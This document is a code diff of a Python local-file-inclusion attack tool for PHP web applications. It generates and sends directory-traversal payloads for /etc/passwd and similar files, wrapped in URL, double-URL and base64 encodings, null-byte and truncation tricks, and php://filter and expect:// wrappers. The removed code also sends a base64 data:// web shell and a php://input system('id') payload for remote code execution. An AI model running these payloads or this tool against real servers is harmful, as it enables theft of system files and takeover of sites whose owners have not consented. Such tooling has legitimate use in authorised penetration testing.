@@ -1,10 +1,31 @@
+# options to make
+# 1. absolute path                                                                                              DONE
+# dir traversal with ../../../                                                                                  DONE     
+# dir traversal but starts with /../../../ to go arount filename prefixes                                       DONE 
+# use alternative traversals for nonrecursive ../ detection:
+#   ....//, ..././, ....\/, ....////                                                                            DONE
+# use double //: ..//..//..//                                                                                   DONE
+# use urlencoding: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                                                      DONE
+# use double urlencoding: %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd                           DONE
+# -- use base64 encoding: Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==                                                      DONE 
+# -- use double base64 encoding: TGk0dkxpNHZMaTR2TGk0dlpYUmpMM0JoYzNOM1pBPT0=                                   DONE 
+# start the string off with valid path: ./languages/../../../../etc/passwd                                      HOW????????
+# start the string off with invalid path: a/../../../etc/passwd                                                 DONE 
+# -- OLD php string truncation: ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
+# nullbytes with /etc/passwd%00                                                                                 DONE
+# read source code php://filter/read=convert.base64-encode/resource=config                                      NEED TO TRY LOTTA FILENAMES
+# try \ instead of /                                                                                            DONE
+# php filters                                                                                                   FAT
+
+# used https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
+# and https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
+
+import pathlib
+import base64
 from optparse import OptionParser
-from time import sleep
-import os
+import json
 import requests
-import urllib.parse
 import sys
-# from termcolor import colored
 
 class bcolors:
     HEADER = '\033[95m'
@@ -17,257 +38,290 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-linuxFilenames = []
-windowsFilenames = []
-macFilenames = []
+#region Payload Generation
 
-dirTraversalPrefix = [
-    '',
-    'C:',
-    'D:',
-    '../../../../../../../../../../../../../../../..',
-    '/../../../../../../../../../../../../../../../..',
-    '....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//..../',
-    '/....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//..../',
-    '/..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././.../.',
-]
+def urlencodeAll(string):
+    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)
 
-osLogFiles = {
-    'linux': 'Linux.txt',
-    'windows': 'Win.txt',
-    'mac': 'Mac.txt'
+def prefixPath(pl):
+    payloads = []
+    for x in pl:
+        payloads.append("../../../../../../" + x);
+    return payloads
+        
+def prefixPathSlash(pl):
+    payloads = []
+    for x in pl:
+        payloads.append("/../../../../../../" + x);
+    return payloads
+
+def prefixPathNR(pl, multiple=False):
+    payloads = []
+    for x in pl:
+        payloads.append("....////....////....////....////....////....////" + x);
+        if multiple:
+            payloads.append("....//....//....//....//....//....//" + x);
+            payloads.append("..././..././..././..././..././..././" + x);
+            payloads.append("....\\/....\\/....\\/....\\/....\\/....\\/" + x);
+    return payloads
+
+def prefixDouble(pl):
+    payloads = []
+    for x in pl:
+        payloads.append("..//..//..//..//..//..//" + x);
+    return payloads
+
+def forceBackslash(pl):
+    payloads = []
+    for x in pl:
+        payloads.append(x.replace("/", "\\"));
+    return payloads
+
+def urlencodePay(pl):
+    payloads = []
+    for x in pl:
+        payloads.append(urlencodeAll(x));
+    return payloads
+
+def doubleUrlencodePay(pl):
+    payloads = []
+    for x in pl:
+        payloads.append(urlencodeAll(urlencodeAll(x)));
+    return payloads
+
+def base64Pay(pl):
+    payloads = []
+    for x in pl:
+        payloads.append(base64.b64encode(x.encode('ascii')).decode("ascii"));
+    return payloads
+
+def doubleBase64Pay(pl):
+    payloads = []
+    for x in pl:
+        payloads.append(base64.b64encode(base64.b64encode(x.encode('ascii'))).decode("ascii"));
+    return payloads
+
+def prefixInvalidPath(pl):
+    payloads = []
+    for x in pl:
+        payloads.append("UNLIKELYFILENAMEAHA/" + x);
+    return payloads
+
+def suffixNullbytes(pl):
+    payloads = []
+    for x in pl:
+        payloads.append(x + "%00");
+    return payloads
+
+def filterB64(pl):
+    payloads = []
+    for x in pl:
+        payloads.append("php://filter/read=convert.base64-encode/resource=" + x);
+    return payloads
+
+def append4096(pl):
+    payloads = []
+    for x in pl:
+        payloads.append(x + "/." * 2048)
+    return payloads
+
+defaultOptions = {
+    "base": True,
+    "pref": True,
+    "prefS": True,
+    "prefNR": True,
+    "prefNRM": False,
+    "prefD": True,
+    "back": True,
+    "prefInv": True,
+    "nullbytes": True,
+    "urlencode": True,
+    "urlencodeD": False,
+    "base64": False,
+    "base64D": False,
+    "phpfilter64": True,
+    "phpexpect": True,
+    "phpstreams": True,
+    "phpstring": False
 }
 
-def getFilenames():
-    linuxFilenames = open('./lfiFiles/Linux.txt', 'r').read().split('\n')
-    windowsFilenames = open('./lfiFiles/Win.txt', 'r').read().split('\n')
-    macFilenames = open('./lfiFiles/Mac.txt', 'r').read().split('\n')
+fullOptions = {
+    "base": True,
+    "pref": True,
+    "prefS": True,
+    "prefNR": True,
+    "prefNRM": True,
+    "prefD": True,
+    "back": True,
+    "prefInv": True,
+    "nullbytes": True,
+    "urlencode": True,
+    "urlencodeD": True,
+    "base64": True,
+    "base64D": True,
+    "phpfilter64": True,
+    "phpexpect": True,
+    "phpstreams": True,
+    "phpstring": True
+}
 
-def addNullByte(str):
-    return str + '%00'
+def generate(files, options):
+    base = files if options["base"] else []
+    base += prefixPath(files) if options["pref"] else []
+    base += prefixPathSlash(files) if options["prefS"] else []
+    base += prefixPathNR(files, options.get("prefNRM",0)) if options["prefNR"] else []
+    base += prefixDouble(files) if options["prefD"] else []
 
-def addStrTruncBuffer(str): #~4100 bytes, 4096 needed for php str trunc
-    return str + '/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.'
+    forward = base
+    forward += prefixInvalidPath(forward) if options["prefInv"] else []
+    forward += forceBackslash(forward) if options["back"]  else []
+    forward += filterB64(files) if options["phpfilter64"] else [] # just takes the base files, doesnt need dir traversal, do want to append %00 though.
+    forward += ["expect://ls"] if options["phpexpect"] else []
+    forward += ["php://stdin", "php://stdout", "php://stderr"] if options["phpstreams"] else []
+    
+    output = forward
+    output += suffixNullbytes(forward) if options["nullbytes"] else []
+    output += append4096(forward) if options["phpstring"] else []
+    
+    output += urlencodePay(forward) if options["urlencode"] else []
+    output += doubleUrlencodePay(forward) if options["urlencodeD"] else []
+    output += base64Pay(forward) if options["base64"] else []
+    output += doubleBase64Pay(forward) if options["base64D"] else []
 
-def urlEncode(str, encodeDots=True):
-    if encodeDots:
-        return urllib.parse.quote(str, safe='').replace('.', '%2E')
-    return urllib.parse.quote(str, safe='')
+    pathlib.Path("./out").mkdir(parents=True, exist_ok=True)
+    outFile = open("./out/payload.txt", "w+")
+    outFile.writelines(line + '\n' for line in output)
+    return output
+
+#endregion
+
+responseType = ('', -2, 403)
 
 def getTextLen(str):
     return len(str.encode('utf-8'))
 
-class Realfion:
-    def __init__(self, options):
-        self.url = options.url
-        self.os = options.os
-        self.page = self.url.split('?')[0].split('/')[-1]
-        self.escape_ext = options.escape_ext
-        self.urlEncode = options.urlEncode
-        self.shouldFindLogs = options.findLogs
-        self.checkResponseType()
+def deleteLastLine():
+    sys.stdout.write('\x1b[1A')
+    sys.stdout.write('\x1b[2K')
 
-    def execute(self):
-        # if self.os.lower() == 'windows':
-        #     self.executeWin()
-        # else:
-        self.executeLin()
-
-    def checkResponseType(self):
-        print('Checking server response..')
-        r1 = requests.get(self.url + '?ඖྦྷ⎲')
-        r2 = requests.get(self.url + '?ඖඖྦྷ⎲')
-        r3 = requests.get(self.url + '?ඖඖඖྦྷ⎲')
-        if r1.text == r2.text == r3.text:
-            self.responseType = ('nofeedback', getTextLen(r1.text))
-            print(f'Detected no feedback from server, going in {bcolors.BOLD}blind{bcolors.ENDC}')
-        else:
-            self.responseType = ('feedback', max(getTextLen(r1.text), getTextLen(r2.text), getTextLen(r3.text)))
-            print(f'Detected some feedback from server, i can {bcolors.BOLD}see!{bcolors.ENDC}')
-        print('\n')
-
-    def isLFI(self, respText):
-        if self.responseType[0] == 'feedback':
-            if ('Warning: include' not in respText and
-                'failed to open stream:' not in respText and
-                'No such file or directory' not in respText):
-                return True
-            else:
-                return False
-        else:
-            return getTextLen(respText) != self.responseType[1]
-
-    def encodePayload(self, payload, method):
-        for i in range(len(dirTraversalPrefix)):
-            if str(i) in method:
-                payload = dirTraversalPrefix[i] + payload
-                break
-        
-        if 'urlencoded' in method:
-            if 'nodot' in method:
-                payload = urlEncode(payload, False)
-            else:
-                payload = urlEncode(payload, True)
-        
-        if 'nullbyte' in method:
-            payload = addNullByte(payload)
-        elif 'phptrunc' in method:
-            payload = addStrTruncBuffer(payload)
+def checkResponseType(url):
+    print('Checking server response..')
+    r1 = requests.get(url + '?ඖྦྷ⎲')
+    r2 = requests.get(url + '?ඖඖྦྷ⎲')
+    r3 = requests.get(url + '?ඖඖඖྦྷ⎲')
+    r1len = getTextLen(r1.text)
+    r2len = getTextLen(r2.text)
+    r3len = getTextLen(r3.text)
+    # print(r1len, r2len, r3len)
+    if r1.text == r2.text == r3.text:
+        responseType = ('nofeedback', r1len, r1.status_code)
+        print(f'Detected no feedback from server, going in {bcolors.BOLD}blind{bcolors.ENDC}')
+    else:
+        if abs(r1len - r2len) > 100 or abs(r1len - r3len) > 100 or abs(r2len - r3len) > 100:
+            responseType = ('random', -1, r1.status_code)
+            print(f'{bcolors.FAIL}Server response seemingly random. Exiting..{bcolors.ENDC}')
             
-        return payload
+        else:
+            responseType = ('feedback', max(r1len, r2len, r2len), r1.status_code)
+            print(f'Detected some {bcolors.BOLD}feedback{bcolors.ENDC} from server.')
+    print('\n')
 
-    def printRequest(self, file, tlen, tislfi, pl):
-            out1 = 'Size: ' + str(tlen) + ' Payload: ' + (pl if len(pl) < 100 else pl[:100] + '{...}') + (f'{bcolors.OKGREEN} --Success{bcolors.ENDC}' if tislfi else '')
+badText = [
+    'was not found',
+    'Warning: include',
+    'failed to open stream:',
+    'No such file or directory'
+]
+
+def checkLFI(response):
+    if str(response.status_code)[0] != "2" and response.status_code == responseType[2]:
+        return False
+    if response.status_code == 403 or response.status_code == 404:
+        return False
+    
+    if responseType[0] == 'feedback' or responseType[0] == 'random':
+        for x in badText:
+            if x in response.text:
+                return False
+        return True
+    else:
+        return getTextLen(response.text) != responseType[1]
+
+def printIfLFI(payloadLine, response, writeToFile):
+        tlen = getTextLen(response.text)
+        isLFI = checkLFI(response)
+        file = open("out/attackResults.txt", "w+")
+        if isLFI:
+            out1 = f"Status: " + (f"{bcolors.OKGREEN}" if str(response.status_code)[0] == "2" else f"{bcolors.FAIL}") + f"{response.status_code}{bcolors.ENDC}"
+            out1 += f"\tSize: {tlen}\t"
+            out1 += "Payload: " + (payloadLine if len(payloadLine) < 100 else payloadLine[:100] + "{...}")
             print(out1)
-            out2 = 'Size: ' + str(tlen) + ' Payload: ' + pl + (' --Success' if tislfi else '') + '\n'
+            out2 = f"Status: {response.status_code}\tSize: {tlen}\tPayload: {payloadLine}\n"
             file.write(out2)
-
-    def directoryTraversal(self):
-        print(f'{bcolors.OKBLUE}Trying directory traversal..{bcolors.ENDC}')
-
-        f = open('output_traversal.txt', 'w+')
-        results = []
-        payload = self.createTraversalPayloads()
-        for (pl, method) in payload:
-            r = requests.get(self.url + pl)
-            results.append((getTextLen(r.text), pl, r.text, method))
-            self.printRequest(f, getTextLen(r.text), self.isLFI(r.text), pl)
-        
-        print('\n')
-        ok = False
-        method = ''
-        if self.responseType[0] == 'nofeedback':
-            results = list(filter(lambda var: var[0] != self.responseType[1], results))
-            if len(results) > 0:
-                ok = True
-                method = results[0][3]
-                print(f'{bcolors.OKGREEN}LFI most likely successful with payload: {bcolors.ENDC}' + results[0][1])
-                print(f'{bcolors.OKGREEN}Using method: {bcolors.ENDC}' + results[0][3])
         else:
-            results.sort(key=lambda tup: tup[0])
-            for res in results:
-                if ('Warning: include' not in res[2] and
-                    'failed to open stream:' not in res[2] and
-                    'No such file or directory' not in res[2]):
-                    ok = True
-                    method = res[3]
-                    print(f'{bcolors.OKGREEN}LFI most likely successful with payload: {bcolors.ENDC}' + res[1])
-                    print(f'{bcolors.OKGREEN}Using method: {bcolors.ENDC}' + res[3])
-                    break
+            print(f"{bcolors.FAIL}Status: {response.status_code}\tSize: {tlen}\tPayload: {payloadLine}{bcolors.ENDC}")
 
-        if not ok:
-            print(f'{bcolors.FAIL}Could not perform directory traversal{bcolors.ENDC}, trying wrappers...')
-        else:
-            print('Output saved to output_traversal.txt')
-        return (ok, str(method))
+def attack(url, payload, writeToFile = True):
+    print(f'{bcolors.OKBLUE}Attacking the server..{bcolors.ENDC}')
+    checkResponseType(url)
+    
+    for i in range(len(payload)):
+        r = requests.get(url + payload[i])
+        deleteLastLine()
+        printIfLFI(payload[i], r, writeToFile)
+        print(f"{bcolors.BOLD}[{i}/{len(payload)}]{bcolors.ENDC}")
 
-    def lfiWrappers(self):
-        ok = False
-        print(f'\n\n{bcolors.OKBLUE}Trying php wrappers..{bcolors.ENDC}')
-        f = open('output_wrappers.txt', 'w+')
-        r = requests.get(self.url + 'php://filter/read=convert.base64-encode/resource=' + self.page.replace('.php', ''))
-        ok |= self.isLFI(r.text)
-        self.printRequest(f, getTextLen(r.text), self.isLFI(r.text), 'php://filter/read=convert.base64-encode/resource=' + self.page.replace('.php', ''))
-        r = requests.get(self.url + 'php://filter/read=convert.base64-encode/resource=' + self.page)
-        ok |= self.isLFI(r.text)
-        self.printRequest(f, getTextLen(r.text), self.isLFI(r.text), 'php://filter/read=convert.base64-encode/resource=' + self.page)
-        r = requests.get(self.url + 'expect://id')
-        ok |= (('uid' in r.text) or (self.isLFI(r.text)))
-        self.printRequest(f, getTextLen(r.text), ('uid' in r.text) or (self.isLFI(r.text)), 'expect://id')
-        r = requests.get(self.url + 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id')
-        ok |= (('uid' in r.text) or (self.isLFI(r.text)))
-        self.printRequest(f, getTextLen(r.text), ('uid' in r.text) or (self.isLFI(r.text)), 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id')
-        r = requests.post(self.url + 'php://input', data='<?php system("id");?>')
-        ok |= (('uid' in r.text) or ((self.isLFI(r.text)) and r.status_code != 403))
-        self.printRequest(f, getTextLen(r.text), ('uid' in r.text) or ((self.isLFI(r.text)) and r.status_code != 403), 'php://input   with <?php system("id"); ?> as POST data')
 
-        if not ok:
-            print(f'\n{bcolors.FAIL}Could not perform LFI with php wrappers{bcolors.ENDC}, trying RFI...')
-        else:
-            print('\nOutput saved to output_wrappers.txt')
+fileForOS = {
+    "linux": "lfiFiles/Linux.txt",
+    "windows": "lfiFiles/Win.txt",
+    "mac": "lfiFiles/Mac.txt"
+}
 
-    def executeLin(self):
-        (ok, dirMethod) = self.directoryTraversal()
-        if ok:
-            if self.shouldFindLogs:
-                self.findLogs(dirMethod)
-            else:
-                inp = input(f'{bcolors.BOLD}Try to find logs?[y/n]:{bcolors.ENDC}')
-                if 'y' in inp.lower():
-                    self.findLogs(dirMethod)
-
-        if not ok:
-            self.lfiWrappers()
-
-    def findLogs(self, method, logFile='./lfiFiles/'):
-        print(f'\n{bcolors.OKBLUE}Enumerating server..{bcolors.ENDC}')
-        logFile += osLogFiles[self.os]
-        fileList = open(logFile, 'r').read().split('\n')
-        file = open('output_foundfiles.txt', 'w+')
-
-        foundFiles = []
-        for filename in fileList:
-            print('Trying: ' + filename)
-            payload = self.encodePayload(filename, method)
-            r = requests.get(self.url + payload)
-            if self.isLFI(r.text):
-                print(f'{bcolors.OKGREEN}Found: {bcolors.ENDC}' + filename)
-                foundFiles.append(filename)
-                file.write(filename + '\n')
-        
-        print(f'\n{bcolors.OKGREEN}Found files: {bcolors.ENDC}')
-        for x in foundFiles:
-            print(x)
-        print('\nOutput saved in output_foundfiles.txt\n')
-
-    def createTraversalPayloads(self, basefile='/etc/passwd'):
-        print('Creating simple payloads..')
-        payload = []
-        for x in dirTraversalPrefix:
-            payload.append((x + basefile, str(dirTraversalPrefix.index(x))))
-        if self.urlEncode:
-            payloadtemp = payload.copy()
-            for (x, y) in payloadtemp:
-                payload.append((urlEncode(x), y + ' urlencoded'))
-            for (x, y) in payloadtemp:
-                if '.' in x:
-                    payload.append((urlEncode(x, False), y + ' urlencodednodot'))
-        if self.escape_ext:
-            payloadtemp = payload.copy()
-            for (x, y) in payloadtemp:
-                payload.append((addNullByte(x), y + ' nullbyte'))
-            for (x, y) in payloadtemp:
-                payload.append((addStrTruncBuffer(x), y + ' phptrunc'))
-        return payload
-
+testerForOS = {
+    "linux": "/etc/passwd",
+    "windows": "/Windows/System32/drivers/etc/hosts",
+    "mac": "/etc/hosts"
+}
 
 def main():
     parser = OptionParser()
     parser.add_option('-u', '--url', dest='url', help='URL that you want to scan (e.g. http://very.secure.com/index.php?page=)')
-    parser.add_option('-o', '--operating-system', dest='os', default='linux', help='operating system that the machine is running (linux, windows)')
-    parser.add_option('-e', '--dont-escape-extension', action="store_false", dest='escape_ext', default=True, help='if you dont want to try to escape the .php extension with null byte and php string concat')
-    parser.add_option('--due', '--dont-url-encode', action='store_false', dest='urlEncode', default=True, help='dont upload payloads that are url encoded, enabled by default')
-    parser.add_option('-l', '--logs', action='store_true', dest='findLogs', help='try to find logs (for potential RCE) with the method that LFI detection found (if found)')
-    parser.add_option('-m', '--encode-method', '--em', action='store', dest='encodeMethod', help='encode payload with method. separate with ; (e.g. realfion.py -m "/etc/passwd; 1 urlencoded nullbyte")')
-    parser.add_option('--lm', '--logs-method', action='store', dest='logsMethod', help='try to find server logs with method specified')
-    # parser.print_help()
-    (options, args) = parser.parse_args()
-    if not options.url:
-        print('No URL specified. Exiting..')
-        exit()
-    realfion = Realfion(options)
-
-    if options.encodeMethod != None:
-        x = options.encodeMethod.split(';')
-        print(realfion.encodePayload(x[0], x[1]))
-    elif options.logsMethod != None:
-        realfion.findLogs(options.logsMethod)
+    parser.add_option('-o', '--operating-system', dest='os', default='linux', help='Operating system that the machine (server) is running (linux, windows, mac)')
+    parser.add_option("-f", "--full-options", dest="full", action="store_true", default=False, help="Use every method avalible.")
+    parser.add_option("-j", "--json-options", dest="json", help="Use a JSON file to supply the options for the LFI.")
+    parser.add_option("-c", "--custom-files", dest="files", help="Apply LFI methods for all potential files in specified file. Value: 1 to use built-in list for specified OS.")
+    parser.add_option('-p', '--payload-file', dest='payload', help="Specify the payload file to be used instead of generating one.")
+    parser.add_option("-d", "--dont-attack", dest="dontAttack", action="store_true", default=False, help="Just make the payload file, don't send requests to the server.")
+    
+    # probs remove, too much of a hassle to implement parser.add_option('-l', '--logs', action='store_true', dest='findLogs', help='try to find logs (for potential RCE) with the method that LFI detection found (if found)')
+    parser.add_option('-w', '--wrappers', action='store_true', dest='onlyWrappers', help='only try php wrappers for the url')
+    
+    (commandOptions, args) = parser.parse_args()
+    
+    payload = []
+    if commandOptions.payload != None:
+        payload = open(commandOptions.payload, "r").read().split('\n')
     else:
-        realfion.execute()
+        baseFiles = []
+        if commandOptions.files != None:
+            baseFiles = open(commandOptions.files if commandOptions.files != "1" else fileForOS[commandOptions.os], "r").read().split('\n')
+        else:
+            baseFiles = [testerForOS[commandOptions.os]]
+        
+        options = defaultOptions
+        if commandOptions.full == True:
+            options = fullOptions
+        if commandOptions.json != None:
+            options = json.load(open(commandOptions.json))
 
-    print('\nPress Enter to continue..')
-    input()
-
-
+        payload = generate(baseFiles, options)
+    
+    if commandOptions.dontAttack == True:
+        print("Saved payload. Not attacking.")
+        exit()
+        
+    attack(commandOptions.url, payload)
+    
 if __name__ == "__main__":
     main()
